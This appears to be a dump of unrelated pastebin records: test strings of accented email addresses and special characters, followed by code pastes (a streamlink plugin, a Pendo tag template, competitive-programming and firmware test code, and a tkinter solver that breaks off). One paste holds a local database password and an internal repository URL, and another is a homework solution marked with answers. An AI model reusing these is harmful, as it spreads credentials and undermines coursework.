Noëlla@findmetesting.com
Anaël@findmetesting.com
Maëlyss@findmetesting.com
Lucrèce@findmetesting.com
Lén@findmetesting.com
Marie-thérèse@findmetesting.com
Maéna@findmetesting.com
Hélène@findmetesting.com
Hélèna@findmetesting.com
Méng@findmetesting.com
Crééz@findmetesting.com
Mélanie@findmetesting.com
Frédérique@findmetesting.com
Médiamass@findmetesting.com
André@findmetesting.com
Cinéma@findmetesting.com
Mégane@findmetesting.com
Amélie@findmetesting.com
Nadège@findmetesting.com
Rébecca@findmetesting.com
Médiamass@findmetesting.com
Céline@findmetesting.com
Maïly@findmetesting.com
Maï@findmetesting.com
Maëlann@findmetesting.com
Noëlla@findmetesting.com
Laurélie@findmetesting.com
Ruì@findmetesting.com
Chloé@findmetesting.com
Gaëlle@findmetesting.com
Vénus@findmetesting.com
Frédérique@findmetesting.com
Amélie@findmetesting.com
Loïs@findmetesting.com
Marlène@findmetesting.com
Stévina@findmetesting.com
Clémentine@findmetesting.com
Mégane@findmetesting.com
Méng@findmetesting.com
André@findmetesting.com
Crééz@findmetesting.com
Aí@findmetesting.com
Uò@findmetesting.com
Yú@findmetesting.com
Marie-françoise@findmetesting.com
Uò@findmetesting.com
Inès@findmetesting.com
Océane@findmetesting.com
Marie-ève@findmetesting.com
Rébecca@findmetesting.com
Zoé@findmetesting.com
Lài@findmetesting.com
Rachèle@findmetesting.com
Cécile@findmetesting.com
Maïlys@findmetesting.com
Garçon@findmetesting.com
hereiam@testing.com

It's a game of per%entage percentage.
Findme#testing Findme testing.
Over&over&over Over over over.
[findmeinbrackets], findmeinbrackets
(findmeinbrackets), findmeinbrackets
<findmeinbrackets>, findmeinbrackets
{findmeinbrackets>}, findmeinbrackets
http://findme-testing.here.com
http:\\findme-testing.here.com

Vestibulum ante ipsum primis in faucibus orci luctus et ultrices Garçon@findmetesting.com cubilia Curae; Mauris viverra diam vitae quam. Suspendisse potenti. 
Lorem ipsum dolor sit amet, consectetuer adipiscing elit. Ellerey.Fanti@findmetesting.cn risus. Praesent lectus.

Vivamus metus arcu, adipiscing findmetesting@findmetesting.com, hendrerit at, vulputate vitae, nisl.

Fuzzy-Wuzzy	- DASH
Fuzzy;Wuzzy	- COLON
Fuzzy!Wuzzy	- EXCLAMATION
Fuzzy£Wuzzy	- POUND
Fuzzy#Wuzzy	- HASH
Fuzzy%Wuzzy	- PERCENT
Fuzzy@Wuzzy	- AT
Fuzzy&Wuzzy	- AND
Fuzzy=Wuzzy	- EQUAL
Fuzzy§Wuzzy
Fuzzy~Wuzzy
Fuzzy?Wuzzy	 - QUESTION MARK
Fuzzy$Wuzzy	 - DOLLAR
Fuzzy[Wuzzy] - BRACKETS
Fuzzy^Wuzzy
Fuzzy(Wuzzy) - BRACKETS
Fuzzy+Wuzzy	 - PLUS
Fuzzy±Wuzzy	 - PLUS/MINUE
Fuzzy|Wuzzy	 - PIPE
Fuzzy/Wuzzy	 - FORWARDSLASH
Fuzzy<Wuzzy> - BRACKETS
Fuzzy{Wuzzy} - CURLY
Fuzzy\Wuzzy  - BACKSLASH"
1P7SiTWV,catcast,urgoz,Python,Tuesday 27th of June 2023 10:07:01 AM CDT,"import re
from streamlink.plugin import Plugin
from streamlink.stream import HLSStream
from streamlink.plugin.api import useragents

class Catcast(Plugin):
    url_re = re.compile(r'https?://catcast.tv/player/(?P<id>\d+)')
    api_url = ""https://api.catcast.tv/api/channels/{id}/getcurrentprogram""
    @classmethod
    def can_handle_url(cls, url):
        return cls.url_re.match(url) is not None
        
    def _get_streams(self):
        channel_id = self.url_re.match(self.url).group(""id"")
        headers = {""User-Agent"": useragents.CHROME}
        body = self.session.http.get(self.api_url.format(id=channel_id), headers=headers).text
        mrl = None
        match = re.search(r'full_mobile_url"":""(.*?)\""', body)
        if match:
            mrl = match.group(1).replace('\/','/')
        if mrl:
            yield ""live"", HLSStream(self.session, mrl)

__plugin__ = Catcast"
LK573weD,Tealium (Pendo) default,bheng8200,JavaScript,Tuesday 27th of June 2023 10:04:00 AM CDT,"//~~tv:16053.20181129
//~~tc: Adding tag Pendo.io

var pendo = window[""pendo""] = window[""pendo""] || {};
pendo._q = [];

//tealium universal tag - utag.sender.16053 ut4.0.##UTVERSION##, Copyright ##UTYEAR## Tealium.com Inc. All Rights Reserved.
try {
  (function (id, loader) {
    var u = {""id"" : id};
    utag.o[loader].sender[id] = u;
    // Please do not modify
    if (utag.ut === undefined) { utag.ut = {}; }
    // Start Tealium loader 4.41
    /* utag.js version 4.26 or above is required to avoid errors with this loader function */
    var match = /ut\d\.(\d*)\..*/.exec(utag.cfg.v);
    if (utag.ut.loader === undefined || !match || parseInt(match[1]) < 41) { u.loader = function(o, a, b, c, l, m) { utag.DB(o); a = document; if (o.type == ""iframe"") { m = a.getElementById(o.id); if (m && m.tagName == ""IFRAME"") { b = m; } else { b = a.createElement(""iframe""); } o.attrs = o.attrs || {}; utag.ut.merge(o.attrs, { ""height"": ""1"", ""width"": ""1"", ""style"": ""display:none"" }, 0); } else if (o.type == ""img"") { utag.DB(""Attach img: "" + o.src); b = new Image(); } else { b = a.createElement(""script""); b.language = ""javascript""; b.type = ""text/javascript""; b.async = 1; b.charset = ""utf-8""; } if (o.id) { b.id = o.id; } for (l in utag.loader.GV(o.attrs)) { b.setAttribute(l, o.attrs[l]); } b.setAttribute(""src"", o.src); if (typeof o.cb == ""function"") { if (b.addEventListener) { b.addEventListener(""load"", function() { o.cb(); }, false); } else { b.onreadystatechange = function() { if (this.readyState == ""complete"" || this.readyState == ""loaded"") { this.onreadystatechange = null; o.cb(); } }; } } if (o.type != ""img"" && !m) { l = o.loc || ""head""; c = a.getElementsByTagName(l)[0]; if (c) { utag.DB(""Attach to "" + l + "": "" + o.src); if (l == ""script"") { c.parentNode.insertBefore(b, c); } else { c.appendChild(b); } } } }; } else { u.loader = utag.ut.loader; }
    // End Tealium loader
    // Start Tealium typeOf 4.35
    if (utag.ut.typeOf === undefined) { u.typeOf = function(e) {return ({}).toString.call(e).match(/\s([a-zA-Z]+)/)[1].toLowerCase();};} else { u.typeOf = utag.ut.typeOf; }
    // End Tealium typeOf

    u.ev = {""view"" : 1};
    u.initialized = false;
    u.scriptrequested = false;
    u.queue = [];

    u.map_func = function (arr, obj, item) {
      var i = arr.shift();
      obj[i] = obj[i] || {};
      if (arr.length > 0) {
        u.map_func(arr,obj[i], item);
      } else {
        obj[i] = item;
      }
    };

    u.hasOwn = function (o, a) {
      return o != null && Object.prototype.hasOwnProperty.call(o, a);
    };

    u.isEmptyObject = function (o, a) {
      for (a in o) { if (u.hasOwn(o, a)) {return false;}} return true;
    };

    u.toBoolean = function (val) {
      val = val || """";
      return val === true || val.toLowerCase() === ""true"" || val.toLowerCase() === ""on"";
    };

    ##UTGEN##

    // Start Loader Callback
    u.loader_cb = function (a, b, c) {
      utag.DB(""send:##UTID##:CALLBACK"");
      u.initialized = true;
      if(u.toBoolean(u.data.send_user_data)){
        var pendo_object = {}, options;
        if(u.data.additional_keys.length > 0){pendo_object.additionalApiKeys = u.data.additional_keys;}
        if(u.toBoolean(u.data.exclude_text)){pendo_object.excludeAllText = u.toBoolean(u.data.exclude_text);}
        if(u.toBoolean(u.data.disable_guides)){pendo_object.disableGuides = u.toBoolean(u.data.disable_guides);}
        if(u.toBoolean(u.data.exclude_title)){pendo_object.excludeTitle = u.toBoolean(u.data.exclude_title);}
        for(options in u.data.custom){
          pendo_object[options] = u.data.custom[options];
        }
        if(!u.isEmptyObject(u.data.visitor)){pendo_object.visitor = u.data.visitor;}
        if(!u.isEmptyObject(u.data.account)){pendo_object.account = u.data.account;}
        pendo.initialize(pendo_object);
      }
      utag.DB(""send:##UTID##:CALLBACK:COMPLETE"");
    };
    // End Loader Callback

    u.callBack = function () {
      var data = {};
      while (data = u.queue.shift()) {
        u.data = data.data;
        u.loader_cb(data.a, data.b, data.c);
      }
    };

    u.send = function (a, b) {
      if (u.ev[a] || u.ev.all !== undefined) {
        utag.DB(""send:##UTID##"");
        utag.DB(b);

        var c, d, e, f;

        u.data = {
          ""qsp_delim"" : ""&"",
          ""kvp_delim"" : ""="",
          ""base_url"" : ""https://cdn.pendo.io/agent/static/##utag_api_key##/pendo.js"",
          ""api_key"" : ""##UTVARconfig_api_key##"",
          ""additional_keys"" : ""##UTVARconfig_additional_keys##"",
          ""send_user_data"" : ""##UTVARconfig_send_user_data##"",
          ""visitor"" : {},
          ""account"" : {},
          ""exclude_text"" : """",
          ""disable_guides"" : """",
          ""exclude_title"" : """",
          ""custom"" : {}
        };

        // Start tag-scoped extensions
        ##UTEXTEND##
        utag.DB(""send:##UTID##:EXTENSIONS"");
        utag.DB(b);
        // End tag-scoped extensions

        c = [];

        // Start Mapping
        for (d in utag.loader.GV(u.map)) {
          if (b[d] !== undefined && b[d] !== """") {
            e = u.map[d].split("","");
            for (f = 0; f < e.length; f++) {
              var checkProp = e[f].split(""."");
              if (u.data.hasOwnProperty(checkProp[0])) {
                u.map_func(e[f].split("".""), u.data, b[d]);
              } else {
                u.data.custom[e[f]] = b[d];
              }
            }
          }
        }
        utag.DB(""send:##UTID##:MAPPINGS"");
        utag.DB(u.data);
        // End Mapping

        var options = [""initialize"", ""identify"", ""updateOptions"", ""pageLoad""];
        var w, x = options.length;
        for (w = 0; w < x; ++w){
            pendo[options[w]] = pendo[options[w]] || function() {pendo._q[options[w] === options[0] ? ""unshift"" : ""push""]([options[w]].concat([].slice.call(arguments, 0)));};
          }

        // Report required config is missing, and stop tag from firing.
        if (!u.data.api_key) {
          utag.DB(u.id + "": Tag not fired: Required attribute not populated"");
          return;
        }

        u.data.base_url = u.data.base_url.replace(""##utag_api_key##"",u.data.api_key);

        if (u.initialized) {
          u.loader_cb(a, b, c);
        } else {
          // While waiting for the external library to load, queue up all of the events with their corresponding data objects.
          u.queue.push({""data"" : u.data, ""a"" : a, ""b"" : b, ""c"" : c});
          if (!u.scriptrequested) {
            u.scriptrequested = true;
            u.loader({
              ""type"" : ""script"",
              ""src"" : u.data.base_url,
              ""cb"" : u.callBack,
              ""loc"" : ""script"",
              ""id"" : ""utag_##UTID##"",
              ""attrs"" : {}
            });
          }
        }
        utag.DB(""send:##UTID##:COMPLETE"");
      }
    };
    utag.o[loader].loader.LOAD(id);
  }(""##UTID##"", ""##UTLOADERID##""));
} catch (error) {
  utag.DB(error);
}
//end tealium universal tag
"
R9ktPiHY,IOI '05 P3 - Mountain,erek1e,C++,Tuesday 27th of June 2023 10:02:33 AM CDT,"#include <iostream>
#include <vector>
#include <algorithm>
#include <cassert>

using namespace std;

vector<int> relevantID; // compressed indices

// Segment tree
class Node {
private:
    long long mx = 0;
    long long propAdd = 0; // for query that adds on range
    long long propA = -1, propB = -1; // for query that sets range to A*i + B
    Node * left, * right;
    void add(long long k) { // adds k over this node's range
        mx += k;
        propAdd += k;
    }
    void set(int l, int r, long long a, long long b) { // sets this node's range to a*relevantID[i] + b
        propAdd = 0;
        propA = a, propB = b;
        mx = max(a*relevantID[l] + b, a*relevantID[r-1] + b); // linear, so maximum is at one of the endpoints
    }

    void prop(int l, int r) { // this node covers range [l, r)
        if (!left) left = new Node();
        if (!right) right = new Node();
        if (propA == -1 && propB == -1) {
            left->add(propAdd);
            right->add(propAdd);
        } else {
            int m = (l + r) / 2;
            propB += propAdd;
            left->set(l, m, propA, propB);
            right->set(m, r, propA, propB);
        }
        propAdd = 0;
        propA = -1, propB = -1;
    }

public:
    // Updates
    void rangeAdd(int l, int r, int ql, int qr, long long k) { // adds k between indices ql and qr
        if (r <= ql || qr <= l) return;
        if (ql <= l && r <= qr) add(k);
        else {
            prop(l, r);
            int m = (l + r) / 2;
            left->rangeAdd(l, m, ql, qr, k);
            right->rangeAdd(m, r, ql, qr, k);
            mx = max(left->mx, right->mx);
        }
    }
    void rangeSet(int l, int r, int ql, int qr, long long a, long long b) { // sets range between ql and qr to a*relevantID[i] + b
        if (r <= ql || qr <= l) return;
        if (ql <= l && r <= qr) set(l, r, a, b);
        else {
            prop(l, r);
            int m = (l + r) / 2;
            left->rangeSet(l, m, ql, qr, a, b);
            right->rangeSet(m, r, ql, qr, a, b);
            mx = max(left->mx, right->mx);
        }
    }

    // Queries
    long long getValue(int l, int r, int i) {
        Node * node = this;
        while (l+1 < r) {
            node->prop(l, r);
            int m = (l + r) / 2;
            if (i < m) node = node->left, r = m;
            else node = node->right, l = m;
        }
        return node->mx;
    }
    int firstGreaterThan(int l, int r, int h) {
        if (mx <= h) return r; // no such nodes
        Node * node = this;
        while (l+1 < r) {
            node->prop(l, r);
            int m = (l + r) / 2;
            if (node->left->mx > h) node = node->left, r = m;
            else node = node->right, l = m;
        }
        return l;
    }
};

int main() {
    // Input and compress indices of points
    ios_base::sync_with_stdio(0); cin.tie(0); cout.tie(0);
    int n; cin >> n;
    vector<int> queryA, queryB, queryD;
    relevantID = {0, n};
    for (char c; cin >> c && c != 'E'; ) {
        if (c == 'I') {
            int a, b, D; cin >> a >> b >> D;
            queryA.push_back(a);
            queryB.push_back(b);
            queryD.push_back(D);
            relevantID.push_back(a);
            if (a > 1) relevantID.push_back(a-1);
            relevantID.push_back(b);
            if (b < n) relevantID.push_back(b+1);
        } else {
            int h; cin >> h;
            queryA.push_back(-1);
            queryB.push_back(-1);
            queryD.push_back(h);
        }
    }
    sort(relevantID.begin(), relevantID.end());
    relevantID.resize(unique(relevantID.begin(), relevantID.end()) - relevantID.begin());
    int m = relevantID.size();
    
    // Build segment tree of max height in range of size m on relevant indices
    Node * root = new Node();
    for (size_t q = 0; q < queryA.size(); ++q) {
        if (queryA[q] == -1) { // Query
            int h = queryD[q];
            int pos = root->firstGreaterThan(0, m, h);

            int smallestIndex = n+1;
            if (pos < m) {
                int curID = relevantID[pos], prvID = relevantID[pos-1];
                long long curV = root->getValue(0, m, pos), prvV = root->getValue(0, m, pos-1);
                // the function must be linear between prv and cur
                assert(prvV <= h);
                assert((curV-prvV)%(curID-prvID) == 0);
                int D = (curV-prvV)/(curID-prvID);
                int steps = (h-prvV)/D + 1;
                assert(prvID + steps <= curID);
                
                smallestIndex = prvID + steps;
            }
            
            cout << smallestIndex-1 << '\n';
        } else { // Update
            int a = queryA[q], b = queryB[q], D = queryD[q];
            // find compressed positions
            int first = lower_bound(relevantID.begin(), relevantID.end(), a) - relevantID.begin();
            int last = lower_bound(relevantID.begin(), relevantID.end(), b) - relevantID.begin();

            long long lastInitial = root->getValue(0, m, last);

            // we know that first-1 is the compressed index for a-1 and last+1 is the compressed index for b+1, since we added a-1 and b+1 into relevantID
            long long v = root->getValue(0, m, first-1);
            // A*id + B = value, D * (a-1) + B = v <=> B = v - D(a-1)
            root->rangeSet(0, m, first, last+1, D, v-D*(a-1LL));

            long long lastFinal = root->getValue(0, m, last);
            long long suffixDelta = lastFinal - lastInitial;
            root->rangeAdd(0, m, last+1, m, suffixDelta);
        }
    }
    return 0;
}"
a52R2TYF,poj_panduan,killtdj,Bash,Tuesday 27th of June 2023 09:57:04 AM CDT,"// requirements
1. Nodejs [https://nodejs.org/dist/v16.16.0/node-v16.16.0-x64.msi]
2. Xampp [https://www.apachefriends.org/]

// clone
git clone https://cicd.optimajasa.co.id/danudenny/poj-web/ (master)
git checkout staging

// create branch baru ketika mau ngoding
git checkout -b nama_branch(feature/No Tiket)

git add .
git commit -am ""[W2.001] title""
git push origin feature/No Tiket

// ketika sudah selesai di merge
get checkout staging
git pull origin staging


// serve project nya
.env udah sesuai sama credential db local
DB_CONNECTION=pgsql
DB_HOST=localhost
DB_PORT=5434
DB_DATABASE=attdev_poj_db
DB_USERNAME=postgres
DB_PASSWORD=masterpass

php artisan optimize
php artisan serve
npm run dev

localhost:8000"
yxMPGj7d,ch09-proj2.js,funtique,JavaScript,Tuesday 27th of June 2023 09:51:03 AM CDT,"//  CIS 525 HW6, Lab 9.2
//  Name: Théo Leblanc

// Instruction #3
//  TODO the main handler
document.addEventListener(""DOMContentLoaded"", function () { // ANSWER
    const paintings = JSON.parse(content);
    function getTitles(paintings) {
      const list1 = [];
      paintings.forEach((item) => {
        list1.push(item.title);
      });
      return list1;
    } 
    function getImages(paintings) {
      const list1 = [];
      paintings.forEach((item) => {
        list1.push(item.title);
      });
      return list1;
    }
  
    const details = document.querySelector(""#details""); // ANSWER
    const list = document.querySelector(""ul""); // TODO  ***1
    const figure = document.querySelector(""figure""); // TODO  ***2
  
    // Instruction 3, sentence 4
    // TODO Call the function generate mini images - passing in the list and paintings as objects
    // ANSWER something like, must match function definition below  - any name, but pass in the two params)
    generateThumbList(list, paintings); // ANSWER (may vary depending on your function name below)
  
    // use event delegation to handle clicks in list
    list.addEventListener(""click"", function (e) {
        if (e.target && e.target.nodeName == ""IMG"") {
        //  TODO Call display large image function ()
        displayLargePainting(e.target); // ANSWER (may vary depending on your function name below)
      }
    });
  
    // Function definition to generate the mini images - this is used to select an image
    // TODO function ..... {
  
    function generateThumbList(list, paintings) {
      // ANSWER  (may vary - whatever you tried to call from above)
      // loop thru list of paintings and create <li><img></li>
      for (p of paintings) {
        const item = document.createElement(""li"");
        // const thumb = // TODO
        const thumb = document.createElement(""img""); //ANSWER
  
        thumb.src = ""images/small/"" + p.id + "".jpg"";
        thumb.alt = p.title; // TODO  // ANSWER   p.title;
        thumb.dataset.id = p.id; // TODO   ANSWER   = p.id;
        
        item.appendChild(thumb); //  TODO append thumb by using appendChild method of item ***3
        list.appendChild(item); //  TODO append item by using appendChild method of list  ***4
        
      }
    }
  
    //  Function definition to display Large image after its mini image is selected
    //  ANSWER whatever you tried to call the function name above -  in this example
    function displayLargePainting(clickedThumbImage) {   // ANSWER
  
      // retrieve the painting id from data-id attribute
      //  let id = // TODO  get the the clicked Thumb's image ID
      let id = clickedThumbImage.dataset.id; // ANSWER  name of parameter defined in function.  use dataset.id property to set to local variable
      // find that painting in array
      const painting = paintings.find(function (p) {
        return p.id == id;
      });
  
      // display the found painting
      document.querySelector(""#title"").textContent = painting.title;
      document.querySelector(""#artist"").textContent = ""By "" + painting.artist;
      let image = document.createElement(""img"");
      image.src = ""images/large/"" + painting.id + "".jpg"";
  
      // Instruction #4, third sentence
      // clear previous features
      // TODO clear out existing inner HTML value
      figure.innerHTML = """"; // ANSWER
  
      // display all features for this painting
      displayFeatures(painting.features);
      // add painting to image
      figure.appendChild(image);
    }
  
    function displayFeatures(features) {
      for (let f of features) {
        displaySingleFeatureRectangle(f);
      }
    }
  
    // Instruction #5
    // function definition here that will display Single Feature Rectangle
    function displaySingleFeatureRectangle(feature) {
      let rect = document.createElement(""div"");
      //  TODO Instruction 5, sentence 5
      // assign using CSS class name
      rect.classname = ""box""; // ANSWER
  
      // Instruction 5, sentence 6 , set CSS (position, left, top, width, height)
      rect.style.position = ""absolute""; // TODO CSS set position style to absolute  ***5
      rect.style.border = ""1px solid #ffe6e6"";
      rect.style.background = ""rgba(255 , 230, 230, 0.3) "";
  
      //  TODO set left and top based on feature  - Instruction 5, sentence 8  - use px
  
      //left = rect.sytle.left = feature.upperLeft[0] + ""px""; // ANSWER
      rect.style.left = feature.upperLeft[0] + ""px""; //Answer
  
      rect.style.top = feature.upperLeft[1] + ""px"";// TODO set css for TOP ***6
      //top = rect.sytle.top = feature.upperLeft[1] + ""px"";
      
      // TODO CSS set width and height by calculations  - Instruction 5, sentence 9  - use px unit
      rect.style.width = feature.lowerRight[0] - feature.upperLeft[0] + ""px""; // TODO CSS set width  ***7
      rect.style.height = feature.lowerRight[1] - feature.upperLeft[1] + ""px"";// TODO CSS set height ***8
  
      // Instruction #6
      // add event handlers for the feature rectangle - WHEN MOUSE OVER
      // TODO  for mouse over
      rect.addEventListener(""mouseover"", function (e) {  // ANSWER
        document.querySelector(""#description"").textContent = feature.description; //  TODO  Use querySelector to get description value  , Instruction #6, sentence 2 ***9
      });
      // Instruction #6
      // add event handlers for the feature rectangle - WHEN MOUSE OUT
        rect.addEventListener(""mouseout"", function (e) { // TODO on mouse out  ***10
        document.querySelector(""#description"").textContent = """"; //  TODO  Use querySelector to erase description value, Instruction #6, sentence 4 ***11
      });
      // add the feature rectangle to the <figure> parent
      figure.appendChild(rect);// TODO  append the rectangle to the figure  use appendChild method.  ***12
    }
});
  
  
"
1W0LBQBP,BMP DFU F4 testcase,ALTracer,C,Tuesday 27th of June 2023 08:56:41 AM CDT,"/* 
 * Test snippet derived from Black Magic Debug sources.
 *
 * Copyright (C) 2013 Gareth McMullin <gareth@blacksphere.co.nz>
 * Main test entrypoint by ALTracer <tolstov_den@mail.ru>
 * `env CFLAGS=""-Wall -O2 -pipe -std=gnu11 -ggdb3"" gcc $CFLAGS dfu_f4.c -o dfu_f4`
 */

#include <stdint.h>
#include <assert.h>
#include <stdio.h>

#define ARRAY_LENGTH(arr) (sizeof(arr) / sizeof((arr)[0]))

static uint32_t sector_addr[] = {
	0x8000000,
	0x8004000,
	0x8008000,
	0x800c000,
	0x8010000,
	0x8020000,
	0x8040000,
	0x8060000,
	0x8080000,
	0x80a0000,
	0x80c0000,
	0x80e0000,
	0x8100000,
	0,
};

static uint16_t sector_erase_time[] = {500, 500, 500, 500, 1100, 2600, 2600, 2600, 2600, 2600, 2600, 2600, 2600};
static uint8_t sector_num = 0xff;

static_assert(ARRAY_LENGTH(sector_erase_time) == ARRAY_LENGTH(sector_addr) - 1U,
	""Number of sectors must equal number of erase time values"");

/* Find the sector number for a given address */
static void get_sector_num(uint32_t addr)
{
	if (addr < sector_addr[0])
		return;
	size_t i;
	for (i = 1; sector_addr[i]; ++i) {
		if (addr < sector_addr[i])
			break;
	}
//	i--;

	if (!sector_addr[i])
		return;
	sector_num = i & 0x1fU;
}

/* The test loop */
static int run_test(void)
{
	const uint32_t test_addr[] = {0x08000000, 0x08004000, 0x08008000, 0x800c000, 0x8010000};
	int fails = 0;
	for (size_t n = 0; n < ARRAY_LENGTH(test_addr); n++) {
		get_sector_num(test_addr[n]);
		fprintf(stdout, ""Sector num for addr=0x%08X is %d, resolves to 0x%08X; "", test_addr[n], sector_num, sector_addr[sector_num]);
		if (test_addr[n] != sector_addr[sector_num]) {
			fprintf(stdout, ""Failed: flash sector address mismatch!\n"");
			fails++;
		} else {
			fprintf(stdout, ""Pass\n"");
		}
	}
	return fails;
}

int main(int argc, char *argv[])
{
	fprintf(stdout, ""Testing Black Magic Probe DFU for STM32F4 logic.\n"");
	return run_test();
}
"
s3uRQFk2,Untitled,phpface,CSS,Tuesday 27th of June 2023 08:54:59 AM CDT,".sidebar.sidebar-primary.sticky-top {
    top: 0;
    z-index: 90;
    margin-bottom: 1.5rem;
}"
36shLtD5,Untitled,r2d3,Python,Tuesday 27th of June 2023 08:50:56 AM CDT,"#!/usr/bin/env python3

from pygdbmi import gdbmiparser
from pprint import pprint

info = ('^ok,summary={\n'
 'address=""0x16fdfcc20"",\n'
 'numchild=""1"",\n'
 'sortable=""1"",\n'
 'children=[\n'
 '{\n'
 'iname=""settings.@1"",\n'
 'name=""[QObject]"",\n'
 'sortgroup=""999"",\n'
 'address=""0x16fdfcc20"",\n'
 'address=""0x16fdfcc20"",\n'
 'numchild=""1"",\n'
 'type=""QObject"",\n'
 'value="""",\n'
 '},\n'
 '],\n'
 'type=""QSettings"",\n'
 'value="""",\n'
 '},')

print(""=""*60)
pprint(info)
print(""=""*60)
print(info)

response = gdbmiparser.parse_response(info)
print(""=""*60)
pprint(response)

#{'message': None,
# 'payload': '^ok,summary={\n'
#            'address=""0x16fdfcc20"",\n'
#            'numchild=""1"",\n'
#            'sortable=""1"",\n'
#            'children=[\n'
#            '{\n'
#            'iname=""settings.@1"",\n'
#            'name=""[QObject]"",\n'
#            'sortgroup=""999"",\n'
#            'address=""0x16fdfcc20"",\n'
#            'address=""0x16fdfcc20"",\n'
#            'numchild=""1"",\n'
#            'type=""QObject"",\n'
#            'value="""",\n'
#            '},\n'
#            '],\n'
#            'type=""QSettings"",\n'
#            'value="""",\n'
#            '},',
# 'type': 'output'}


"
7ZbuwNNf,Primative List,imk0tter,C++,Tuesday 27th of June 2023 08:40:42 AM CDT,"//////////////////////
// Primative_list.h //
//////////////////////
#if X64
typedef long POINTER;
#else
typedef int POINTER;
#endif

class Primative_List {
private:
protected:
  POINTER GetEntry(int index);
  POINTER list_ptr;
public:
  Primative_List();
  virtual ~Primative_List();

  int Count();

  void Add(POINTER object_ptr);

  void Delete();

  POINTER Get(int index);
};


////////////////////////
// Primative_List.cpp //
////////////////////////
#include ""Primative_List.h""
#include <iostream>

POINTER Primative_List::GetEntry(int index) {
  // TODO: FROG CODE THAT EVALUATES POINTER MORE THAN ONCE (more than one set of
  // brackets)
 
  // Points to head of list (this->list_ptr)
    POINTER current = this->list_ptr;

  //Iterates to the element at index 'index'
  for (int i = 0; i < index; ++i) {

    // Current points to the current element in the list, the next element is at the address stored in the 'current' variable
    // the address at 'current' contains an address to the next element in the list which contains an address to the next element in the list
    current = *(POINTER*)current;
  }
  // Return the next element in the list
  return *(POINTER*)current;
}

int Primative_List::Count() 
{ 
    // points to the second element in the head of the list (stores the number of elements in the list)
    return ((POINTER *)this->list_ptr)[1];
}

Primative_List::Primative_List() {
  // allocates enough memory for 2 integers (sizeof(int) * 2)
    //this->list_ptr = ((int)malloc(sizeof(int) * 2));
    this->list_ptr = (POINTER)(POINTER*)new POINTER[2];

  //sets the first node in the list to this->list_ptr
  *((POINTER*)this->list_ptr) = this->list_ptr;

  //sets the second element of the head of the list to 0 (the number of elements in the list)
  ((POINTER*)this->list_ptr)[1] = 0;
}

void Primative_List::Add(POINTER object_ptr) {
  // allocates enough memory for 2 integers for a new entry in the list
    POINTER new_entry = (POINTER)(POINTER*)new POINTER[2];

  // sets the first element in the new_entry list element to the address at the head of the list
  *(POINTER*)new_entry = *(POINTER*)this->list_ptr;
  ((POINTER*)new_entry)[1] = object_ptr;
  *(POINTER*)this->list_ptr = new_entry;
  // increments the counter at the second node of the head of the list (this->list_ptr) array (contains the number of objects in the list)
  ++((POINTER*)this->list_ptr)[1];
}

void Primative_List::Delete() {
    //std::cout << ""Primative_List->Delete() called.\n"";
  // TODO: FROG CODE DELETE ALL AT SAME TIME (more than one set of bracket )

    // point the variable 'current' to the address at this->list_ptr
  int current = *(POINTER*)this->list_ptr;
  for (int i = 0; i < this->Count(); ++i) {
     POINTER old = current;
    current = *(POINTER*)old; // deobfuscated
    delete (POINTER*)old;
  }
  delete (POINTER*)list_ptr;
}

POINTER Primative_List::Get(int index) {
  // Gets the list entry at index 'index' and returns the object it points to
  return ((POINTER*)this->GetEntry(index))[1];
}

Primative_List::~Primative_List() {
    //std::cout << ""Primative_list dtor called.\n"";
    //Calls the function that deletes all the list elements in the list when user attempts to delete the Primative_List object
    this->Delete();
}

"
jaKwGUPd,Untitled,phpface,CSS,Tuesday 27th of June 2023 08:32:11 AM CDT,"body.search .post-meta__author {
    display: none;
}"
97WJEUZw,tkinter method,edward4324,Python,Tuesday 27th of June 2023 08:14:31 AM CDT,"import numpy as np
import matplotlib.pyplot as plt
from mpl_toolkits.mplot3d import Axes3D
from matplotlib.backends.backend_tkagg import FigureCanvasTkAgg
import tkinter as tk
from tkinter import ttk


def solve_system(R, L, G, C):
    # Границы расчетной области
    x_start = 0.0
    x_end = 1.0
    t_start = 0.0
    t_end = 1.0

    # Шаги по координате и времени
    dx = 0.1
    dt = 0.01

    # Создание сетки
    x_grid = np.arange(x_start, x_end + dx, dx)
    t_grid = np.arange(t_start, t_end + dt, dt)
    num_x = len(x_grid)
    num_t = len(t_grid)

    # Инициализация массивов для хранения значений u и i
    u = np.zeros((num_t, num_x))
    i = np.zeros((num_t, num_x))

    # Установка начальных и граничных условий
    u[0, :] = 0.0  # Начальное условие для u
    i[0, :] = 1.0  # Начальное условие для i
    u[:, 0] = 0.0  # Граничное условие u при x = x_start
    u[:, -1] = 0.0  # Граничное условие u при x = x_end
    i[:, 0] = 0.0  # Граничное условие i при x = x_start
    i[:, -1] = 0.0  # Граничное условие i при x = x_end

    # Явная схема конечных разностей
    for n in range(num_t - 1):
        for j in range(1, num_x - 1):
            u[n+1, j] = u[n, j] + dt * (R * i[n, j] + L * (i[n, j+1] - i[n, j-1]) / (2 * dx))
            i[n+1, j] = i[n, j] + dt * (G * u[n+1, j] + C * (u[n+1, j+1] - u[n+1, j-1]) / (2 * dx))

    return x_grid, t_grid, u, i


def update_plot(*args):
    R = resistance_var.get()
    L = inductance_var.get()
    G = leakage_var.get()
    C = capacitance_var.get()

    x_grid, t_grid, u, i = solve_system(R, L, G, C)

    ax_u.clear()
    ax_u.set_xlabel('x')
    ax_u.set_ylabel('t')
    ax_u.set_zlabel('u')
    ax_u.set_title('Solution for u(x, t)')
    ax_u.plot_surface(*np.meshgrid(x_grid, t_grid), u, cmap='viridis')

    ax_i.clear()
    ax_i.set_xlabel('x')
    ax_i.set_ylabel('t')
    ax_i.set_zlabel('i')
    ax_i.set_title('Solution for i(x, t)')
    ax_i.plot_surface(*np.meshgrid(x_grid, t_grid), i, cmap='viridis')

    canvas.draw()


# Создание графического интерфейса с использованием Tkinter
root = tk.Tk()
root.title('Telegraph Equations Solver')

# Создание фрейма для параметров
params_frame = ttk.LabelFrame(root, text='Parameters')
params_frame.pack(padx=10, pady=10)

# Создание переменных для связи значений
resistance_var = tk.DoubleVar()
inductance_var = tk.DoubleVar()
leakage_var = tk.DoubleVar()
capacitance_var = tk.DoubleVar()

# Создание полей ввода для параметров
resistance_label = ttk.Label(params_frame, text='Resistance (R):')
resistance_label.grid(row=0, column=0, padx=5, pady=5, sticky='E')
resistance_entry = ttk.Entry(params_frame, width=10, textvariable=resistance_var)
resistance_entry.insert(tk.END, '1.0')
resistance_entry.grid(row=0, column=1, padx=5, pady=5)
resistance_entry.bind('<Return>', update_plot)

